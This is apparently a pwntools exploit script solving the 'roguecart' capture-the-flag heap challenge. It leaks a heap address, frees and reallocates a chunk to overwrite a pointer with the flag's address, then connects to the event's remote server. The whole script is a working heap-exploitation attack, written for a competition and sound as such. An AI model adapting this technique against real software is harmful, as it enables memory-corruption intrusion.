#!/usr/bin/env python3

from pwn import *

exe = ELF('roguecart', checksec=False)
# libc = ELF('', checksec=False)
context.binary = exe
rop = ROP(exe)

context.terminal = ['/mnt/c/Windows/System32/cmd.exe', '/c', 'start', 'wt.exe', '-w', '0', 'split-pane', "--size", "0.6", '-d', '.', 'wsl.exe','-d', 'Ubuntu', 'bash', '-c' ]

info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.p.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())

def GDB():
    if not args.REMOTE and not args.DOCKER:
        gdb.attach(p, gdbscript='''
        set context-sections args regs disasm stack code expressions heap_tracker threads last_signal
        set follow-fork-mode parent
        
        b*0x0000000000401773


        
        c
        ''')
        input()

if args.REMOTE:
    p = remote('roguecart.aws.jerseyctf.com', 1337)
elif args.DOCKER:
    p = remote('127.0.0.1')
else:
    p = process([exe.path])
GDB()

def choice_free():
    slna(b'> ', 1)
    
def choice_write():
    slna(b'> ', 3)
    
def choice_malloc(data):
    slna(b'> ', 2)
    sla(b'[ FEED 64 BYTES OF PATCH DATA ]\n', data)
    
p.recvuntil(b'[ SHUTTLE HANDLE: ')
leak = int(p.recv(10), 16)
heap_base = leak &~0xfff
flag = heap_base + 0x2a0
success("Heap leak: " + hex(leak))
success("Heap base: " + hex(heap_base))
success("flag: " + hex(flag))

payload = flat(
    cyclic(0x20),
    flag,
)
choice_free()
choice_malloc(payload)
choice_write()

p.interactive()
